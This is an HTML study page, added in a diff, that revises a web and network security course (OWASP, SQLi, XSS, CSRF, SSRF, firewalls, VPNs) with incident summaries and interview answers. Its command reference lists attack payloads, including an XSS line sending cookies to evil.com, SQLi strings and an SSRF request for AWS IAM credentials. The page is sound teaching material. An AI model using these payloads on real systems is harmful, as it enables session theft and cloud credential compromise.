@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Revision — Day 21 to Day 30</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:960px;margin:0 auto;padding:40px 22px 100px;}
+
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+
+  .hero{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:30px 28px;margin-bottom:36px;}
+  .hero-tag{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:12px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:4px 12px;border-radius:20px;display:inline-block;margin-bottom:14px;}
+  .hero h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(24px,4vw,36px);line-height:1.2;margin-bottom:10px;}
+  .hero h1 span{color:var(--green);}
+  .hero p{color:var(--muted);font-size:14.5px;max-width:640px;}
+  .stat-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:20px;}
+  .stat{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:12px 16px;min-width:100px;}
+  .stat .num{font-family:'IBM Plex Mono',monospace;font-size:22px;color:var(--cyan);font-weight:700;}
+  .stat .lbl{font-size:11px;color:var(--muted);text-transform:uppercase;margin-top:2px;}
+
+  .day-card{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:22px 24px;margin-bottom:20px;}
+  .day-header{display:flex;align-items:flex-start;gap:16px;margin-bottom:16px;}
+  .day-num{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:28px;color:var(--green);min-width:60px;flex-shrink:0;line-height:1;}
+  .day-meta{}
+  .day-title{font-weight:700;font-size:17px;margin-bottom:4px;}
+  .day-incident{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);background:rgba(255,92,92,0.08);border:1px solid rgba(255,92,92,0.2);padding:3px 9px;border-radius:12px;display:inline-block;}
+
+  .section-label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:8px;margin-top:14px;}
+
+  .concept-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px;margin-top:8px;}
+  .concept{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:10px 12px;}
+  .concept .ctitle{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);margin-bottom:4px;font-weight:600;}
+  .concept .cdesc{font-size:12px;color:var(--muted);}
+
+  .qa{border-left:3px solid var(--purple);padding-left:14px;margin-top:10px;}
+  .qa .q{font-weight:600;font-size:13px;color:var(--text);margin-bottom:5px;}
+  .qa .a{font-size:12.5px;color:#b8c2c6;line-height:1.6;}
+
+  .quiz-section{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:26px 28px;margin-top:36px;}
+  .quiz-section h2{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:18px;margin-bottom:6px;}
+  .quiz-section .sub{color:var(--muted);font-size:13.5px;margin-bottom:20px;}
+  .q-item{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:14px 16px;margin-bottom:10px;}
+  .q-item .qnum{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:5px;}
+  .q-item .qtext{font-size:13.5px;color:var(--text);font-weight:600;margin-bottom:8px;}
+  .q-item .ans{font-size:12.5px;color:var(--green);font-family:'IBM Plex Mono',monospace;background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.15);border-radius:5px;padding:6px 10px;}
+
+  .command-table{margin-top:10px;}
+  .cmd-row{display:flex;gap:12px;align-items:flex-start;background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:9px 12px;margin-bottom:6px;}
+  .cmd-row code{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--green);flex-shrink:0;min-width:200px;}
+  .cmd-row .cdesc{font-size:12px;color:var(--muted);}
+
+  .breach-timeline{margin-top:12px;}
+  .bt-row{display:flex;gap:14px;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--edge);}
+  .bt-row:last-child{border-bottom:none;}
+  .bt-row .year{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);min-width:80px;flex-shrink:0;}
+  .bt-row .incident{font-weight:600;font-size:13px;min-width:200px;flex-shrink:0;}
+  .bt-row .detail{font-size:12.5px;color:var(--muted);}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;margin-top:10px;}
+  .ai-pill{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:8px;padding:10px 12px;}
+  .ai-pill .aname{font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--pink);font-weight:700;margin-bottom:3px;}
+  .ai-pill .adesc{font-size:11px;color:var(--muted);}
+
+  .job-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;margin-top:10px;}
+  .job-box{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:8px;padding:12px 14px;}
+  .job-box .day-ref{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--green);margin-bottom:5px;}
+  .job-box .bullet{font-size:12.5px;color:#cdd6da;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;margin-top:36px;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;} .cmd-row{flex-wrap:wrap;} .bt-row{flex-wrap:wrap;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap$ cat revision_day21_to_day30.md</span>
+    <span style="color:var(--green);">Phase 2 — Web &amp; Network Security</span>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-tag">REVISION — DAY 21 TO DAY 30</div>
+    <h1>10 Days Done. <span>Web attacks, firewalls &amp; cloud defense.</span></h1>
+    <p>This page condenses every concept, every real incident, every interview answer, and every command from Days 21–30 into one reference. OWASP Top 10, SQLi, XSS, CSRF, auth bypass, SSRF, firewalls, VPNs — all in one place.</p>
+    <div class="stat-row">
+      <div class="stat"><div class="num">10</div><div class="lbl">Days Done</div></div>
+      <div class="stat"><div class="num">10</div><div class="lbl">Real Incidents</div></div>
+      <div class="stat"><div class="num">31</div><div class="lbl">Tools Used</div></div>
+      <div class="stat"><div class="num">15</div><div class="lbl">Scripts Built</div></div>
+    </div>
+  </div>
+
+  <!-- DAY 21 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">21</div>
+      <div class="day-meta">
+        <div class="day-title">OWASP Top 10 &amp; Web App Security Fundamentals</div>
+        <span class="day-incident">Equifax / Apache Struts CVE-2017-5638 (2017)</span>
+      </div>
+    </div>
+    <div class="section-label">// three mental-model buckets</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Bad Input Handling</div><div class="cdesc">SQLi, XSS — attacker input isn't validated, so it gets executed. #1 on every OWASP list.</div></div>
+      <div class="concept"><div class="ctitle">Bad Access Decisions</div><div class="cdesc">Broken auth, IDOR, CSRF — the system trusts the request without proving identity or permission.</div></div>
+      <div class="concept"><div class="ctitle">Bad Hygiene</div><div class="cdesc">Vulnerable components, security misconfig, insufficient logging — known problems left unfixed.</div></div>
+    </div>
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Equifax 2017 (CVE-2017-5638):</strong> Apache Struts RCE via a malformed Content-Type header. Equifax knew about the patch — it was 2 months old when attackers hit. 147M records. The root cause isn't the exploit — it's OWASP #06 (Vulnerable Components). The patch existed. The process to apply it didn't.</p>
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Walk me through the OWASP Top 10 in one sentence per category.</div>
+      <div class="a">Bad Input (A01-A03): Injection, broken auth, sensitive exposure. Bad Access (A04-A05, A07): IDOR, misconfiguration. Bad Hygiene (A06, A08-A10): vulnerable components, logging failures, SSRF. Group them into three buckets and you'll never blank in an interview.</div>
+    </div>
+  </div>
+
+  <!-- DAY 22 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">22</div>
+      <div class="day-meta">
+        <div class="day-title">OWASP Top 10 Overview</div>
+        <span class="day-incident">OWASP Top 10 2021 — Insecure Design</span>
+      </div>
+    </div>
+    <div class="section-label">// 2021 changes</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Insecure Design (A04)</div><div class="cdesc">NEW category. Bugs are implementation errors; design flaws are architectural. You can't patch bad architecture.</div></div>
+      <div class="concept"><div class="ctitle">SSRF (A10)</div><div class="cdesc">NEW entry. Server-Side Request Forgery — the server makes requests to internal resources based on attacker-supplied URLs.</div></div>
+      <div class="concept"><div class="ctitle">Logging Failures (A09)</div><div class="cdesc">Not knowing you're breached is a vulnerability. If you can't detect it, you can't contain it.</div></div>
+    </div>
+    <div class="section-label">// the real shift</div>
+    <p style="font-size:13.5px;color:#cdd6da;">In 2021 OWASP moved from "how you code" to "how you think about security." Insecure Design means a secure development lifecycle (SDL) with threat modeling at the requirements stage — not bolted on after coding. Most breaches start with a design assumption, not a coding mistake.</p>
+  </div>
+
+  <!-- DAY 23 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">23</div>
+      <div class="day-meta">
+        <div class="day-title">SQL Injection Deep Dive</div>
+        <span class="day-incident">Heartland Payment Systems (2008)</span>
+      </div>
+    </div>
+    <div class="section-label">// three injection types</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">UNION-Based</div><div class="cdesc"><code>' UNION SELECT username,password FROM users --</code> Attacker appends their own SELECT to the original query. Most visible type.</div></div>
+      <div class="concept"><div class="ctitle">Error-Based</div><div class="cdesc">Force the database to spill data in error messages. MySQL <code>extractvalue()</code> reveals data via SQL error output.</div></div>
+      <div class="concept"><div class="ctitle">Blind SQLi</div><div class="cdesc">No data returned — but true/false responses leak one bit at a time. <code>' OR 1=1 --</code> vs <code>' OR 1=2 --</code></div></div>
+    </div>
+    <div class="section-label">// the defense</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>SELECT * FROM users WHERE email = ?</code><div class="cdesc">Parameterized query — the ? is a placeholder. User input is data, not executable. PREVENTS SQLi entirely.</div></div>
+      <div class="cmd-row"><code>cursor.execute("SELECT * FROM users WHERE email = %s", (email,))</code><div class="cdesc">Python psycopg2 example — database driver handles escaping. Never use f-strings for SQL.</div></div>
+    </div>
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How does a parameterized query prevent SQL injection?</div>
+      <div class="a">The SQL statement structure is compiled first with placeholders. User input is sent separately as data — the database engine cannot interpret it as SQL code even if it contains quote characters or UNION keywords. The query structure and the data never mix.</div>
+    </div>
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Heartland Payment Systems (2008):</strong> Albert Gonzalez used SQL injection through web forms to plant SQL queries that extracted 130M credit card numbers over months. Heartland processed 100M transactions/month — the breach wasn't detected by internal monitoring, only by Visa's fraud analytics. $145M in damages.</p>
+  </div>
+
+  <!-- DAY 24 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">24</div>
+      <div class="day-meta">
+        <div class="day-title">Cross-Site Scripting (XSS)</div>
+        <span class="day-incident">British Airways / Magecart (2018)</span>
+      </div>
+    </div>
+    <div class="section-label">// three XSS types</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Stored XSS</div><div class="cdesc">Payload saved on server (e.g., comment field). Every visitor gets infected. Most dangerous.</div></div>
+      <div class="concept"><div class="ctitle">Reflected XSS</div><div class="cdesc">Payload in URL or request. Victim must click a crafted link. Common in search parameters.</div></div>
+      <div class="concept"><div class="ctitle">DOM-Based XSS</div><div class="cdesc">Payload never reaches server — JavaScript reads from URL hash and writes to DOM. Hardest to detect.</div></div>
+    </div>
+    <div class="section-label">// the defense</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>Content-Security-Policy: default-src 'self'</code><div class="cdesc">CSP header — blocks inline scripts and external script sources. Kills most XSS vectors dead.</div></div>
+      <div class="cmd-row"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><div class="cdesc">Classic XSS test payload. If this executes, any script can — not just alerts.</div></div>
+    </div>
+    <div class="section-label">// real incident + interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Walk through the British Airways Magecart attack. What was the root cause?</div>
+      <div class="a">Magecart injected JavaScript via a third-party script vulnerability on BA's payment page. The script read form fields (name, card number, CVV) before HTTPS submission and exfiltrated them to an attacker-controlled domain. 380K transactions compromised. Root cause: no Subresource Integrity (SRI) on third-party scripts and no CSP restricting script-src. Every script loaded had the same privilege as BA's own code.</div>
+    </div>
+  </div>
+
+  <!-- DAY 25 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">25</div>
+      <div class="day-meta">
+        <div class="day-title">CSRF &amp; Session Attacks</div>
+        <span class="day-incident">Facebook CSRF Token Flaw (2013)</span>
+      </div>
+    </div>
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">CSRF</div><div class="cdesc">Attacker tricks your browser into making an authenticated request you didn't intend. Cookie is sent automatically — the server thinks it's you.</div></div>
+      <div class="concept"><div class="ctitle">Session Hijacking</div><div class="cdesc">Stealing a session cookie (via XSS, network sniffing, or leaked token). Attacker now IS you without needing your password.</div></div>
+      <div class="concept"><div class="ctitle">Anti-CSRF Token</div><div class="cdesc">Random token embedded in every form. Server validates it. Attacker's fake form can't know the token.</div></div>
+    </div>
+    <div class="section-label">// defenses</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>Set-Cookie: sessionid=abc; SameSite=Strict</code><div class="cdesc">SameSite=Strict — cookie won't send on cross-site requests. Blocks CSRF at the browser level.</div></div>
+      <div class="cmd-row"><code>&lt;input type="hidden" name="csrf_token" value="random"&gt;</code><div class="cdesc">Anti-CSRF token in forms — server checks it matches the session. Attacker's forged request doesn't have this value.</div></div>
+    </div>
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Facebook CSRF (2013):</strong> attackers crafted image tags that sent POST requests to Facebook's "like" and "post" endpoints while victims were logged in. Since cookies were sent automatically and Facebook lacked anti-CSRF tokens on those endpoints, the forged requests succeeded. Users posted attacker-controlled content without ever clicking a button.</p>
+  </div>
+
+  <!-- DAY 26 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">26</div>
+      <div class="day-meta">
+        <div class="day-title">Broken Authentication &amp; Access Control</div>
+        <span class="day-incident">JWT Algorithm Confusion (2018)</span>
+      </div>
+    </div>
+    <div class="section-label">// authentication vs authorization</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Authentication</div><div class="cdesc">"Who are you?" — login, password, MFA, session token. Proving identity.</div></div>
+      <div class="concept"><div class="ctitle">Authorization</div><div class="cdesc">"What can you do?" — RBAC roles, permissions, access levels. Happens AFTER auth.</div></div>
+    </div>
+    <div class="section-label">// attack techniques</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Credential Stuffing</div><div class="cdesc">Using leaked username/password pairs from one breach to log into another service. Users reuse passwords.</div></div>
+      <div class="concept"><div class="ctitle">MFA Fatigue</div><div class="cdesc">Spam push notifications until the victim accepts one to make it stop. Uber breached this way in 2022.</div></div>
+      <div class="concept"><div class="ctitle">JWT "none" Algorithm</div><div class="cdesc">Change JWT header <code>"alg":"HS256"</code> to <code>"alg":"none"</code>. Some libraries accept and skip signature verification. Forge any token.</div></div>
+    </div>
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: What is JWT algorithm confusion and how do you prevent it?</div>
+      <div class="a">The server reads the token's algorithm header and validates accordingly. If you send {"alg":"none"}, some libraries skip signature verification entirely — you can forge any user's token. Prevention: whitelist allowed algorithms at the application level, never trust the token's header. Use asymmetric (RS256) over symmetric (HS256) and validate the key type matches.</div>
+    </div>
+  </div>
+
+  <!-- DAY 27 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">27</div>
+      <div class="day-meta">
+        <div class="day-title">Security Misconfiguration</div>
+        <span class="day-incident">Verizon S3 Bucket Exposure (2017)</span>
+      </div>
+    </div>
+    <div class="section-label">// what to check</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Default Credentials</div><div class="cdesc">admin:admin, root:toor. First thing every scanner checks. Shodan finds these in production daily.</div></div>
+      <div class="concept"><div class="ctitle">Open S3 Buckets</div><div class="cdesc">Public-read on a bucket means the entire internet can list and download every object. No auth required.</div></div>
+      <div class="concept"><div class="ctitle">Directory Listing</div><div class="cdesc">Server exposes all files in /uploads/. Attackers browse for config files, backups, stored uploads.</div></div>
+      <div class="concept"><div class="ctitle">Verbose Errors</div><div class="cdesc">Stack traces with SQL queries, file paths, and internal IPs. Debug mode in production = free recon.</div></div>
+    </div>
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Verizon S3 (2017):</strong> an internal S3 bucket was left publicly accessible — no authentication required to list or download objects. 14M customer records including names, PINs, account details, and call logs. The bucket was discovered by UpGuard researchers doing routine internet scanning. No sophisticated exploit — just an HTTP request to the bucket URL. This is what "security misconfiguration" looks like.</p>
+    <div class="section-label">// command</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>aws s3 ls s3://bucket-name --no-sign-request</code><div class="cdesc">List an S3 bucket without credentials. If this returns data, the bucket is publicly accessible — a finding in any pentest.</div></div>
+    </div>
+  </div>
+
+  <!-- DAY 28 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">28</div>
+      <div class="day-meta">
+        <div class="day-title">File Upload &amp; SSRF Vulnerabilities</div>
+        <span class="day-incident">Capital One SSRF + S3 Exfiltration (2019)</span>
+      </div>
+    </div>
+    <div class="section-label">// file upload bypasses</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Extension Bypass</div><div class="cdesc">Block .php but accept .php5, .phtml, .PHP (case). Blacklists always miss variations.</div></div>
+      <div class="concept"><div class="ctitle">MIME Bypass</div><div class="cdesc">Server checks Content-Type: image/jpeg. Attacker uploads PHP with image/jpeg header. MIME is just a header — trivially spoofed.</div></div>
+      <div class="concept"><div class="ctitle">Magic Byte Bypass</div><div class="cdesc">Server checks file signature (GIF89a). Attacker prepends GIF header to PHP payload. File command fails, but PHP executes.</div></div>
+    </div>
+    <div class="section-label">// SSRF explained</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">What it is</div><div class="cdesc">Application fetches a URL you provide. Instead of an external URL, you supply http://169.254.169.254/latest/meta-data/ (AWS metadata endpoint).</div></div>
+      <div class="concept"><div class="ctitle">What it gets</div><div class="cdesc">IAM role credentials, internal service info, cloud provider secrets. The server makes the request — firewalls trust the server.</div></div>
+    </div>
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Capital One 2019:</strong> Paige Thompson exploited a misconfigured AWS WAF that allowed SSRF to the EC2 metadata service (169.254.169.254). The metadata service returned IAM role credentials, which had read access to S3 buckets containing 100M+ credit applications. One SSRF request + one over-privileged IAM role = the largest cloud data breach at the time.</p>
+  </div>
+
+  <!-- DAY 29 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">29</div>
+      <div class="day-meta">
+        <div class="day-title">Firewalls, IDS, IPS Explained</div>
+        <span class="day-incident">Palo Alto PAN-OS Zero-Day CVE-2021-3064 (2021)</span>
+      </div>
+    </div>
+    <div class="section-label">// three devices, one goal</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Firewall</div><div class="cdesc">Rules-based gatekeeper. Blocks/allows by port, IP, protocol. Stateless (packet-by-packet) or stateful (tracks connections).</div></div>
+      <div class="concept"><div class="ctitle">IDS (Snort/Suricata)</div><div class="cdesc">Watches traffic, matches against signatures, ALERTS. Does NOT block — you review logs later.</div></div>
+      <div class="concept"><div class="ctitle">IPS (inline)</div><div class="cdesc">Same as IDS but ACTIVE — drops malicious packets in real-time before they reach the target. Higher risk of false positives blocking legit traffic.</div></div>
+    </div>
+    <div class="section-label">// iptables basics</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT</code><div class="cdesc">Allow SSH only from your subnet. Default deny everything else.</div></div>
+      <div class="cmd-row"><code>iptables -A INPUT -p tcp --dport 80 -j DROP</code><div class="cdesc">Drop all HTTP traffic — no web server exposed. Silent reject, no response sent.</div></div>
+      <div class="cmd-row"><code>iptables -L -v -n</code><div class="cdesc">List all rules with packet/byte counters — see what's being matched and how often.</div></div>
+    </div>
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>PAN-OS CVE-2021-3064:</strong> a buffer overflow in Palo Alto's management interface allowed unauthenticated RCE over the network. The irony: the firewall itself needed to be patched. If the management interface was exposed to the internet (a common misconfiguration), attackers could bypass every rule the firewall enforced by owning the firewall itself.</p>
+  </div>
+
+  <!-- DAY 30 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">30</div>
+      <div class="day-meta">
+        <div class="day-title">VPNs &amp; Proxies</div>
+        <span class="day-incident">NordVPN Datacenter Breach (2019)</span>
+      </div>
+    </div>
+    <div class="section-label">// vpn vs proxy</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">VPN</div><div class="cdesc">Encrypted tunnel for ALL traffic at OSI L3. Entire device's traffic routed through remote network. More secure, more overhead.</div></div>
+      <div class="concept"><div class="ctitle">Proxy</div><div class="cdesc">Application-level (L7). Only traffic for that app/protocol. SOCKS5 proxies can handle any TCP traffic but don't encrypt by default.</div></div>
+      <div class="concept"><div class="ctitle">Reverse Proxy</div><div class="cdesc">Sits in front of servers — hides backend topology, terminates TLS, load balances. Nginx, HAProxy.</div></div>
+    </div>
+    <div class="section-label">// openvpn setup</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>openvpn --config client.ovpn</code><div class="cdesc">Connect to an OpenVPN server using client config. All traffic routed through encrypted tunnel.</div></div>
+      <div class="cmd-row"><code>ssh -D 1080 user@remote</code><div class="cdesc">SOCKS5 proxy over SSH. Configure browser to use localhost:1080 — traffic tunnels through SSH.</div></div>
+      <div class="cmd-row"><code>curl --proxy socks5://127.0.0.1:1080 ifconfig.me</code><div class="cdesc">Test your proxy — should show remote server's IP, not yours.</div></div>
+    </div>
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>NordVPN 2019:</strong> a Finnish datacenter hosting a NordVPN server was compromised — unauthorized access to the server room allowed attackers to obtain TLS private keys. NordVPN's PFS (Perfect Forward Secrecy) meant past sessions couldn't be decrypted even with the keys. The takeaway: VPN providers can be compromised at the infrastructure level. PFS protects historical traffic. Always verify a VPN supports it.</p>
+  </div>
+
+  <!-- ALL INCIDENTS TIMELINE -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--red);">⚠</div>
+      <div class="day-meta">
+        <div class="day-title">All 10 Real Incidents — Quick Reference</div>
+        <span class="day-incident">Know these cold — web app &amp; network defense focus</span>
+      </div>
+    </div>
+    <div class="breach-timeline">
+      <div class="bt-row"><div class="year">2008</div><div class="incident">Heartland Payment SQLi</div><div class="detail">Albert Gonzalez used SQL injection to extract 130M card numbers through web forms, $145M damages.</div></div>
+      <div class="bt-row"><div class="year">2013</div><div class="incident">Facebook CSRF Flaw</div><div class="detail">Crafted image tags posted on victims' timelines via authenticated CSRF — no consent needed.</div></div>
+      <div class="bt-row"><div class="year">2017</div><div class="incident">Equifax / Apache Struts</div><div class="detail">CVE-2017-5638 RCE via Content-Type header. 147M records. Patch was 2 months old.</div></div>
+      <div class="bt-row"><div class="year">2017</div><div class="incident">Verizon S3 Exposure</div><div class="detail">14M customer records exposed via publicly accessible S3 bucket — no auth required.</div></div>
+      <div class="bt-row"><div class="year">2018</div><div class="incident">British Airways Magecart</div><div class="detail">XSS via third-party JS injected card-skimmer into payment page. 380K transactions stolen.</div></div>
+      <div class="bt-row"><div class="year">2018</div><div class="incident">JWT Algorithm Confusion</div><div class="detail">Libraries accepting "alg":"none" let attackers forge tokens. Design flaw, not implementation bug.</div></div>
+      <div class="bt-row"><div class="year">2019</div><div class="incident">Capital One SSRF</div><div class="detail">SSRF to EC2 metadata → IAM keys → 100M+ S3 records exfiltrated. Misconfigured WAF.</div></div>
+      <div class="bt-row"><div class="year">2019</div><div class="incident">NordVPN Datacenter</div><div class="detail">Compromised Finnish datacenter exposed private keys. PFS protected past sessions.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">PAN-OS Zero-Day</div><div class="detail">CVE-2021-3064 — buffer overflow in firewall management interface. RCE on the firewall itself.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">OWASP Top 10 2021</div><div class="detail">New categories: Insecure Design and SSRF. Shift from coding bugs to architectural flaws.</div></div>
+    </div>
+  </div>
+
+  <!-- ALL COMMANDS -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--cyan);">&gt;_</div>
+      <div class="day-meta">
+        <div class="day-title">Master Command Reference — Days 21–30</div>
+        <span class="day-incident">Web app testing &amp; defense commands</span>
+      </div>
+    </div>
+    <div class="command-table">
+      <div class="cmd-row"><code>' OR 1=1 --</code><div class="cdesc">SQLi test payload — returns all rows if injection point exists.</div></div>
+      <div class="cmd-row"><code>' UNION SELECT @@version,null --</code><div class="cdesc">UNION-based SQLi — extract database version.</div></div>
+      <div class="cmd-row"><code>&lt;script&gt;fetch('https://evil.com/'+document.cookie)&lt;/script&gt;</code><div class="cdesc">XSS payload exfiltrating session cookie to attacker server.</div></div>
+      <div class="cmd-row"><code>&lt;img src="https://bank.com/transfer?to=attacker&amt=1000"&gt;</code><div class="cdesc">CSRF payload — victim's browser sends auth cookies automatically.</div></div>
+      <div class="cmd-row"><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><div class="cdesc">SSRF test — fetch AWS metadata service for IAM role credentials.</div></div>
+      <div class="cmd-row"><code>aws s3 ls s3://target-bucket --no-sign-request</code><div class="cdesc">Check if S3 bucket is publicly accessible — security misconfiguration test.</div></div>
+      <div class="cmd-row"><code>iptables -A INPUT -p tcp --dport 443 -j ACCEPT</code><div class="cdesc">Allow HTTPS inbound traffic through firewall.</div></div>
+      <div class="cmd-row"><code>iptables -P INPUT DROP</code><div class="cdesc">Default deny all inbound — proper firewall baseline.</div></div>
+      <div class="cmd-row"><code>snort -i eth0 -c /etc/snort/snort.conf</code><div class="cdesc">Start Snort IDS on interface with rule set.</div></div>
+      <div class="cmd-row"><code>openvpn --config client.ovpn</code><div class="cdesc">Connect to OpenVPN server — all traffic encrypted on L3.</div></div>
+      <div class="cmd-row"><code>ssh -D 1080 user@remote</code><div class="cdesc">Create SOCKS5 proxy tunnel through SSH — browser routes through remote.</div></div>
+      <div class="cmd-row"><code>Content-Security-Policy: default-src 'self'</code><div class="cdesc">CSP header blocking all external script sources — XSS mitigation.</div></div>
+      <div class="cmd-row"><code>Set-Cookie: session=abc; SameSite=Strict; HttpOnly</code><div class="cdesc">Secure cookie flags — same-site blocks CSRF, HttpOnly blocks XSS cookie access.</div></div>
+    </div>
+  </div>
+
+  <!-- AI TOOLS -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--pink);">AI</div>
+      <div class="day-meta">
+        <div class="day-title">AI Tools Referenced — Days 21–30</div>
+        <span class="day-incident">Use these alongside your learning</span>
+      </div>
+    </div>
+    <div class="ai-grid">
+      <div class="ai-pill"><div class="aname">Burp Suite + AI</div><div class="adesc">Intercepting web proxy. AI plugins help auto-analyze requests and suggest attack payloads.</div></div>
+      <div class="ai-pill"><div class="aname">sqlmap</div><div class="adesc">Automated SQL injection detection. Paste a request URL and it tests hundreds of injection vectors.</div></div>
+      <div class="ai-pill"><div class="aname">OWASP ZAP + GPT</div><div class="adesc">Open-source web scanner. Feed findings to LLM for remediation guidance and report generation.</div></div>
+      <div class="ai-pill"><div class="aname">Nessus / OpenVAS</div><div class="adesc">Automated vulnerability scanners. AI-assisted prioritization of 10k+ findings.</div></div>
